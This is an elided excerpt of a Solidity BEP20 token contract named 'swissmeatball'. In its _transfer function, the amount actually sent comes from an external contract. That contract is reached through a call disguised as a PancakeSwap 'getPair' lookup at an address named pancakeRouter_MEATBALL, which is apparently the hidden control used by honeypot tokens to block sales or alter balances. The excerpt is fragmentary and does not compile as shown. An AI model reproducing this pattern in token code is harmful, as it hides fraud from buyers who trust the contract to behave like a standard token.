...
contract swissmeatball is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'swissmeatball';
  string private constant _symbol = 'MEATBALL';
  
  uint256 private _totalSupply = 10000000000 *  10**9;
  uint8 private constant _decimals = 9;
  uint256 private _bonusMEATBALL = 0;
  address pancakeRouter_MEATBALL;
  ...
  */
  ...
  function pancakePairMEATBALL(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      resData = IPancake(pancakeRouter_MEATBALL).getPair(_bonusMEATBALL, sender, recipient, arrData);

      _bonusMEATBALL = resData[0];
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmountMEATBALL = pancakePairMEATBALL(sender, recipient, amount);   
     _transferStandard(sender,recipient,bonusAmountMEATBALL);
